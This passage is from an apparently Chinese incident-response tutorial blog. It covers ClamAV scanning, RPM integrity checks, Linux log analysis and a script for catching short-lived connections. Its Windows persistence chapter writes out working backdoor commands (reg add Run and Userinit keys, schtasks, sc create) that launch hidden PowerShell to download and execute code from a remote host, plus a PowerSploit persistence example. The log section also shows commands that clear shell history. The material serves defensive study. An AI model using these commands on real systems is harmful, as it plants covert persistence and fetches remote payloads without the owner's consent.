clamd.log</span><br><span class="line"><span class="built_in">chown</span> clamav:clamav freshclam.log</span><br><span class="line"></span><br><span class="line">5、ClamAV 使用：</span><br><span class="line"> /opt/clamav/bin/freshclam 升级病毒库</span><br><span class="line">./clamscan –h 查看相应的帮助信息</span><br><span class="line">./clamscan -r /home  扫描所有用户的主目录就使用</span><br><span class="line">./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果</span><br></pre></td></tr></table></figure><p>安装方式二：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">yum install -y clamav</span><br><span class="line"><span class="comment">#更新病毒库</span></span><br><span class="line">freshclam</span><br><span class="line"><span class="comment">#扫描方法</span></span><br><span class="line">clamscan -r <span class="string">/etc</span> <span class="params">--max-dir-recursion=5</span> -l <span class="string">/root/etcclamav.log</span></span><br><span class="line">clamscan -r <span class="string">/bin</span> <span class="params">--max-dir-recursion=5</span> -l <span class="string">/root/binclamav.log</span></span><br><span class="line">clamscan -r <span class="string">/usr</span> <span class="params">--max-dir-recursion=5</span> -l <span class="string">/root/usrclamav.log</span></span><br><span class="line"><span class="comment">#扫描并杀毒</span></span><br><span class="line">clamscan -r  <span class="params">--remove</span>  <span class="string">/usr/bin/bsd-port</span></span><br><span class="line">clamscan -r  <span class="params">--remove</span>  <span class="string">/usr/bin/</span></span><br><span class="line">clamscan -r <span class="params">--remove</span>  <span class="string">/usr/local/zabbix/sbin</span></span><br><span class="line"><span class="comment">#查看日志发现</span></span><br><span class="line">cat <span class="string">/root/usrclamav.log</span> |grep FOUND</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-3-webshell查杀">2.3 webshell查杀</h4><p>Linux 版：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">河马 WebShell 查杀：http:<span class="comment">//www.shellpub.com</span></span><br></pre></td></tr></table></figure><h4 id="2-4-RPM-check-检查">2.4 RPM check 检查</h4><p>系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rpm -Va &gt; rpm.<span class="built_in">log</span></span><br></pre></td></tr></table></figure><p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">验证内容中的<span class="number">8</span>个信息的具体内容如下：</span><br><span class="line">S         文件大小是否改变</span><br><span class="line">M         文件的类型或文件的权限（rwx）是否被改变</span><br><span class="line"><span class="number">5</span>         文件<span class="symbol">MD5</span>校验是否改变（可以看成文件内容是否改变）</span><br><span class="line">D         设备中，从代码是否改变</span><br><span class="line">L         文件路径是否改变</span><br><span class="line">U         文件的属主（所有者）是否改变</span><br><span class="line">G         文件的属组是否改变</span><br><span class="line"><span class="built_in">T</span>         文件的修改时间是否改变</span><br></pre></td></tr></table></figure><p>如果命令被替换了，如果还原回来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件提取还原案例：</span><br><span class="line">rpm  -qf /bin/ls  查询 <span class="built_in">ls</span> 命令属于哪个软件包</span><br><span class="line"><span class="built_in">mv</span>  /bin/ls /tmp  先把 <span class="built_in">ls</span> 转移到 tmp 目录下，造成 <span class="built_in">ls</span> 命令丢失的假象</span><br><span class="line">rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 <span class="built_in">ls</span> 命令到当前目录的 /bin/ls 下</span><br><span class="line"><span class="built_in">cp</span> /root/bin/ls  /bin/ 把 <span class="built_in">ls</span> 命令复制到 /bin/ 目录 修复文件丢失</span><br></pre></td></tr></table></figure><h4 id="2-5-Linux安全检查脚本">2.5 Linux安全检查脚本</h4><p>Github 项目地址：</p><p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p><p><a href="https://github.com/ppabc/security_check">https://github.com/ppabc/security_check</a></p><p><a href="https://github.com/T0xst/linux">https://github.com/T0xst/linux</a></p><p><strong>尽信书不如无书，工具只是辅助，别太过于依赖，关键在于你如何解决问题的思路。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第02章：日志分析篇第2篇：Linux日志分析</title>
      <link href="/posts/f07b7e61.html"/>
      <url>/posts/f07b7e61.html</url>
      
        <content type="html"><![CDATA[<h2 id="第2篇-Linux日志分析">第2篇:Linux日志分析</h2><h3 id="0x00-前言">0x00 前言</h3><p>Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 本文简介一下Linux系统日志及日志分析技巧。</p><h3 id="0x01-日志简介">0x01 日志简介</h3><p>日志默认存放位置：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><table><thead><tr><th style="text-align:center">日志文件</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">/var/log/cron</td><td style="text-align:center">记录了系统定时任务相关的日志</td></tr><tr><td style="text-align:center">/var/log/cups</td><td style="text-align:center">记录打印信息的日志</td></tr><tr><td style="text-align:center">/var/log/dmesg</td><td style="text-align:center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td style="text-align:center">/var/log/mailog</td><td style="text-align:center">记录邮件信息</td></tr><tr><td style="text-align:center">/var/log/message</td><td style="text-align:center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td style="text-align:center">/var/log/btmp</td><td style="text-align:center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td style="text-align:center">/var/log/lastlog</td><td style="text-align:center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td style="text-align:center">/var/log/wtmp</td><td style="text-align:center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td style="text-align:center">/var/log/utmp</td><td style="text-align:center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td style="text-align:center">/var/log/secure</td><td style="text-align:center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>比较重要的几个日志：<br>登录失败记录：/var/log/btmp     //lastb<br>最后一次登录：/var/log/lastlog  //lastlog<br>登录成功记录: /var/log/wtmp     //last<br>登录日志记录：/var/log/secure</p><p>​目前登录用户信息：/var/run/utmp  //w、who、users</p><p>​历史命令记录：history<br>​仅清理当前用户： history -c</p><h3 id="0x02-日志分析技巧">0x02 日志分析技巧</h3><h4 id="A、常用的shell命令">A、常用的shell命令</h4><p>Linux下常用的shell命令如：find、grep 、egrep、awk、sed</p><p>小技巧：</p><p>1、grep显示前后几行信息:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​标准unix/linux下的<span class="keyword">grep</span>通过下面參数控制上下文：</span><br><span class="line">​<span class="keyword">grep</span> -C <span class="number">5</span> foo <span class="keyword">file</span> 显示<span class="keyword">file</span>文件里匹配foo字串那行以及上下<span class="number">5</span>行</span><br><span class="line">​<span class="keyword">grep</span> -B <span class="number">5</span> foo <span class="keyword">file</span> 显示foo及前<span class="number">5</span>行</span><br><span class="line">​<span class="keyword">grep</span> -A <span class="number">5</span> foo <span class="keyword">file</span> 显示foo及后<span class="number">5</span>行</span><br><span class="line">​查看<span class="keyword">grep</span>版本号的方法是</span><br><span class="line">​<span class="keyword">grep</span> -V</span><br></pre></td></tr></table></figure><p>2、grep 查找含有某字符串的所有文件</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;hello,world!&quot; </span><br><span class="line">* : 表示当前目录所有文件，也可以是某个文件名</span><br><span class="line"><span class="deletion">-r 是递归查找</span></span><br><span class="line"><span class="deletion">-n 是显示行号</span></span><br><span class="line"><span class="deletion">-R 查找所有文件包含子目录</span></span><br><span class="line"><span class="deletion">-i 忽略大小写</span></span><br></pre></td></tr></table></figure><p>3、如何显示一个文件的某几行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> input_file | <span class="built_in">tail</span> -n +1000 | <span class="built_in">head</span> -n 2000</span><br><span class="line"><span class="comment">#从第1000行开始，显示2000行。即显示1000~2999行</span></span><br></pre></td></tr></table></figure><p>4、find /etc -name init</p><pre><code>//在目录/etc中查找文件init</code></pre><p>5、只是显示/etc/passwd的账户</p><pre><code>`cat /etc/passwd |awk  -F ':'  '&#123;print $1&#125;'`  //awk -F指定域分隔符为':'，将记录按指定的域分隔符划分域，填充域，​$0则表示所有域,$1表示第一个域,​$n表示第n个域。</code></pre><p>6、sed -i ‘153,$d’ .bash_history</p><pre><code>删除历史操作记录，只保留前153行</code></pre><h4 id="B、日志分析技巧">B、日志分析技巧</h4><p><strong>A、/var/log/secure</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep <span class="string">&quot;Failed password for root&quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|grep -E -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|perl -e <span class="string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">2、登录成功的IP有哪些： </span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span> </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: <span class="attribute">name</span>=kali, <span class="attribute">GID</span>=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: <span class="attribute">name</span>=kali, <span class="attribute">UID</span>=1001, <span class="attribute">GID</span>=1001, <span class="attribute">home</span>=/home/kali</span><br><span class="line">, <span class="attribute">shell</span>=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed <span class="keyword">for</span> kali</span><br><span class="line"><span class="comment">#grep &quot;useradd&quot; /var/log/secure </span></span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete<span class="built_in"> user </span><span class="string">&#x27;kali&#x27;</span></span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed<span class="built_in"> group </span><span class="string">&#x27;kali&#x27;</span> owned by <span class="string">&#x27;kali&#x27;</span></span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow<span class="built_in"> group </span><span class="string">&#x27;kali&#x27;</span> owned by <span class="string">&#x27;kali&#x27;</span></span><br><span class="line"><span class="comment"># grep &quot;userdel&quot; /var/log/secure</span></span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened <span class="keyword">for</span><span class="built_in"> user </span>good by root(<span class="attribute">uid</span>=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : <span class="attribute">TTY</span>=pts/4 ; <span class="attribute">PWD</span>=/home/good ; <span class="attribute">USER</span>=root ; <span class="attribute">COMMAND</span>=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure><p><strong>2、/var/log/yum.log</strong></p><p>软件安装升级卸载日志：</p><figure class="highlight plaintext"><figcaption><span>install gcc</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc</span><br><span class="line"></span><br><span class="line">[root@bogon ~]# more /var/log/yum.log</span><br><span class="line"></span><br><span class="line">Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第03章：权限维持篇第2篇：Windows权限维持--后门篇</title>
      <link href="/posts/f8f071fd.html"/>
      <url>/posts/f8f071fd.html</url>
      
        <content type="html"><![CDATA[<p>关键词：Windows系统后门、权限维持</p><p>在获取服务器权限后，通常会用一些后门技术来维持服务器权限，服务器一旦被植入后门，攻击者便如入无人之境。本文将对常见的window服务端自启动后门技术进行解析，知己知彼方能杜绝后门。</p><p><strong>0x01 注册表自启动</strong></p><p>通过修改注册表自启动键值，添加一个木马程序路径，实现开机自启动。</p><p>常用的注册表启动键：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Run键 </span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line"></span><br><span class="line"># Winlogon\Userinit键</span><br><span class="line">HKEY_CURRENT_USER\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon</span><br><span class="line"></span><br><span class="line">类似的还有很多,关键词：注册表启动键值。</span><br></pre></td></tr></table></figure><p>使用以下命令可以一键实现无文件注册表后门：</p><p><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\&quot;&quot; /f</code></p><p><strong>Logon Scripts 后门</strong></p><p>注册表路径：HKEY_CURRENT_USER\Environment\</p><p>创建字符串键值：  UserInitMprLogonScript，键值设置为bat的绝对路径：<code>c:\test.bat</code></p><p><strong>userinit后门</strong></p><p>在用户进行登陆时，winlogon运行指定的程序。根据官方文档,可以更改它的值来添加与删除程序。</p><p>利用USERINIT注册表键实现无文件后门：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;Userinit&quot;</span>=<span class="string">&quot;C:<span class="subst">\\</span>Windows<span class="subst">\\</span>system32<span class="subst">\\</span>userinit.exe,C:<span class="subst">\\</span>Windows<span class="subst">\\</span>System32<span class="subst">\\</span>WindowsPowerShell<span class="subst">\\</span>v1.0<span class="subst">\\</span>powershell.exe -nop -w hidden -c <span class="subst">\&quot;</span>IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.142:8888/logo.gif&#x27;))<span class="subst">\&quot;</span>&quot;</span></span><br></pre></td></tr></table></figure><p><strong>0x02 组策略设置脚本启动</strong></p><p>运行gpedit.msc进入本地组策略，通过Windows设置的“脚本(启动/关机)”项来说实现。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。</p><p><img src="./image/privilege-4-3.png" alt=""></p><p>容易遇到的问题：脚本需全路径，如<code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe </code></p><p><strong>0x03 计划任务</strong></p><p>通过window系统的任务计划程序功能实现定时启动某个任务，执行某个脚本。</p><p>使用以下命令可以一键实现：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /sc minute /mo <span class="number">1</span> /tn <span class="string">&quot;Security Script&quot;</span> /tr <span class="string">&quot;powershell.exe -nop -w hidden -c <span class="subst">\&quot;</span>IEX ((new-object net.webclient).downloadstring(<span class="subst">\&quot;</span><span class="subst">\&quot;</span><span class="subst">\&quot;</span>http://192.168.28.142:8888/logo.gif<span class="subst">\&quot;</span><span class="subst">\&quot;</span><span class="subst">\&quot;</span>))<span class="subst">\&quot;</span>&quot;</span></span><br></pre></td></tr></table></figure><p>容易遇到的问题：cmd命令行执行单引号会被替换成双引号，故这里使用三个双引号替代。</p><p>计划脚本每 1 分钟运行一次。</p><p><img src="./image/privilege-4-4.png" alt=""></p><p><strong>0x04 服务自启动</strong></p><p>通过服务设置自启动，结合powershell实现无文件后门。</p><p>使用以下命令可实现：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc <span class="keyword">create</span> &quot;KeyName&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \&quot;IEX ((<span class="built_in">new</span>-<span class="keyword">object</span> net.webclient).downloadstring(<span class="string">&#x27;http://192.168.28.142:8888/logo.gif&#x27;</span>))\&quot;&quot;</span><br><span class="line"></span><br><span class="line">sc description  KeyName &quot;Just For Test&quot;   //设置服务的描述字符串</span><br><span class="line">sc config <span class="type">Name</span> start= auto                //设置这个服务为自动启动</span><br><span class="line">net <span class="keyword">start</span> <span class="type">Name</span>                            //启动服务</span><br></pre></td></tr></table></figure><p>成功创建了一个自启动服务</p><p><img src="./image/privilege-4-5.png" alt=""></p><p><strong>0x05 WMI后门</strong></p><p>在2015年的blackhat大会上Matt Graeber介绍了一种无文件后门就是用的WMI。这里可以利用一个工具powersploit，下面用它的Persistence模块来示范一个简单的例子。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\Persistence\Persistence.psm1</span><br><span class="line"><span class="variable">$ElevatedOptions</span> = <span class="built_in">New-ElevatedPersistenceOption</span> <span class="literal">-PermanentWMI</span> <span class="literal">-Daily</span> <span class="literal">-At</span> <span class="string">&#x27;3 PM&#x27;</span></span><br><span class="line"><span class="variable">$UserOptions</span> = <span class="built_in">New-UserPersistenceOption</span> <span class="literal">-Registry</span> <span class="literal">-AtLogon</span></span><br><span class="line"><span class="built_in">Add-Persistence</span> <span class="literal">-FilePath</span> .\EvilPayload.ps1 <span class="literal">-ElevatedPersistenceOption</span> <span class="variable">$ElevatedOptions</span> <span class="literal">-UserPersistenceOption</span> <span class="variable">$UserOptions</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure><p><strong>0x06 dll劫持</strong></p><p>如果在进程尝试加载一个DLL时没有指定DLL的绝对路径，那么Windows会尝试去指定的目录下查找这个DLL；如果攻击者能够控制其中的某一 个目录，并且放一个恶意的DLL文件到这个目录下，这个恶意的DLL便会被进程所加载，从而造成代码执行。</p><p>比较常用的如LPK.dll的劫持：</p><p>win7及win7以上系统增加了KnownDLLs保护，需要在注册表：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls</span><br></pre></td></tr></table></figure><p>下添加 “lpk.dll” 才能顺利劫持：</p><p><img src="./image/privilege-4-6.png" alt=""></p><p><strong>0x07 COM劫持</strong></p><p>利用COM劫持技术，最为关键的是dll的实现以及CLSID的选择，通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator劫持，而系统很多正常程序启动时需要调用这两个实例。这种方法可以绕过Autoruns对启动项的检测。</p><p><img src="./image/privilege-4-7.png" alt=""></p><p><strong>0x08 远程控制</strong></p><p>远控木马是一种恶意程序，其中包括在目标计算机上用于管理控制的后门。远程访问木马通常与用户请求的程序（如游戏程序）一起，是一种看不见的下载，或作为电子邮件附件发送。一旦主机系统被攻破，入侵者可以利用它来向其他易受感染的计算机分发远程访问木马，从而建立僵尸网络。</p><p>一般分为客户端和服务端，如：灰鸽子、上兴远控、梦想时代、QuasarRAT等。</p><p><img src="./image/privilege-4-8.png" alt=""></p><p><strong>0x09 结束语</strong></p><p>未知攻焉知防，本文分享了几种Window下的自动启权限维持技术。管理员在平时运维过程应当保持警惕，掌握一定的入侵排查技巧，及时进行系统补丁更新，定期对服务器安全检查，才能有效地预防后门。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第05章：Linux实战篇第2篇：捕捉短连接</title>
      <link href="/posts/5dfa7aec.html"/>
      <url>/posts/5dfa7aec.html</url>
      
        <content type="html"><![CDATA[<h2 id="第2篇：捕捉短连接">第2篇：捕捉短连接</h2><h3 id="0x00-前言">0x00 前言</h3><p>​短连接（short connnection）是相对于长连接而言的概念，指的是在数据传送过程中，只在需要发送数据时，才去建立一个连接，数据发送完成后，则断开此连接，即每次连接只完成一项业务的发送。 在系统维护中，一般很难去察觉，需要借助网络安全设备或者抓包分析，才能够去发现。</p><h3 id="0x01-应急场景">0x01 应急场景</h3><p>​某天，网络管理员在出口WAF检测到某台服务器不断向香港I发起请求 ，感觉很奇怪，登录服务器排查，想要找到发起短连接的进程。</p><h3 id="0x02-日志分析">0x02 日志分析</h3><p>​登录服务器查看端口、进程，并未发现发现服务器异常，但是当多次刷新端口连接时，可以查看该连接。 有时候一直刷这条命令好十几次才会出现，像这种的短连接极难捕捉到对应的进程和源文件。</p><p><img src="./image/linux-11-1.png" alt=""></p><p>手动捕捉估计没戏，很难追踪，于是动手写了一段小脚本来捕捉短连接对应的pid和源文件。</p><p>脚本文件如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">ip=118.184.15.40</span><br><span class="line">i=1</span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">   tmp=netstat -anplt|grep <span class="variable">$ip</span>|awk -F <span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>|awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span></span><br><span class="line">   <span class="comment">#echo $tmp</span></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">test</span> -z <span class="string">&quot;<span class="variable">$tmp</span>&quot;</span></span><br><span class="line">   <span class="keyword">then</span></span><br><span class="line">       ((i=i+<span class="number">1</span>)) </span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">for</span> pid <span class="keyword">in</span> <span class="variable">$tmp</span>; <span class="keyword">do</span></span><br><span class="line">           <span class="built_in">echo</span> <span class="string">&quot;PID: &quot;</span><span class="variable">$&#123;pid&#125;</span></span><br><span class="line">          result=<span class="built_in">ls</span> -lh /proc/<span class="variable">$pid</span>|grep exe</span><br><span class="line">          <span class="built_in">echo</span> <span class="string">&quot;Process: &quot;</span><span class="variable">$&#123;result&#125;</span></span><br><span class="line">          <span class="built_in">kill</span> -9 <span class="variable">$pid</span></span><br><span class="line">       <span class="keyword">done</span></span><br><span class="line">       <span class="built_in">break</span></span><br><span class="line">   <span class="keyword">fi</span> </span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Total number of times: &quot;</span><span class="variable">$&#123;i&#125;</span></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="./image/linux-11-2.png" alt=""></p><p>跑了三次脚本，可以发现短连接每次发起的进程Pid一直在变，但已经捕捉到发起该异常连接的进程源文件为 /usr/lib/nfsiod</p><h3 id="0x04-小结">0x04 小结</h3><p>​本文简单介绍了短连接以及捕捉短连接源文件的技巧，站在安全管理员的角度，应加强对网络安全设备的管理，在网络层去发现更多在系统层很难察觉的安全威胁。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第04章：Windows实战篇第2篇：蠕虫病毒</title>
      <link href="/posts/f914641e.html"/>
      <url>/posts/f914641e.html</url>
      
